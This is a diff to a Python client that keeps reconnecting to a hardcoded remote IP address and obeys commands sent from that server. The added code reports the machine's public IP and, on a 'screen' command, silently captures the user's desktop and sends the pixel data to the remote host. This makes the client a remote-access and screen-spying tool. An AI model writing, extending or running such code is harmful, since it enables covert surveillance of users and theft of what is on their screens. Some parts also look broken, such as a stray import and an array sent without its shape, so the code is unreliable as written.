@@ -1,9 +1,18 @@
+from msilib.schema import Error
 import socket
 import psutil
 import requests
 import select
 import os
+import pyautogui
+import pickle
+import cv2
+from PIL import Image
+from PIL import ImageGrab
 from time import time, sleep
+import numpy as np
+import matplotlib.pyplot as plt
+
 while True:
     try:
         HOST = '124.50.153.32'
@@ -44,6 +53,7 @@ while True:
                 print("exitByServer")
                 break
             elif data.decode() == "Connected":
+                client_socket.sendall((requests.get("http://ip.jsontest.com").json()['ip']).encode())
                 print(data.decode())
             elif data.decode() == "exitAll":
                 print("server shutdown")
@@ -51,12 +61,21 @@ while True:
             elif data.decode() == "exitApp":
                 p = psutil.Process(os.getpid())
                 p.terminate()
+            elif data.decode() == "screen":
+                if not os.path.isdir("C:\\Users\\%s\\Documents\\client" % os.getlogin()):
+                    os.makedirs("C:\\Users\\%s\\Documents\\client" % os.getlogin())
+                myScreenshot = pyautogui.screenshot().save("C:\\Users\\%s\\Documents\\client\\sc.png" % os.getlogin())
+                im = Image.open("C:\\Users\\%s\\Documents\\client\\sc.png" % os.getlogin())
+                img_np = np.array(im)
+                print(img_np)
+                client_socket.sendall(img_np)
 
         # 소켓을 닫습니다.
         client_socket.close()
         print("Restarting...")
-        sleep(2 - time() % 1)
+        sleep(30 - time() % 1)
         print("Restarting complete")
-    except:
+    except Exception as e:
         print("restart due to error")
+        print(e)
         continue
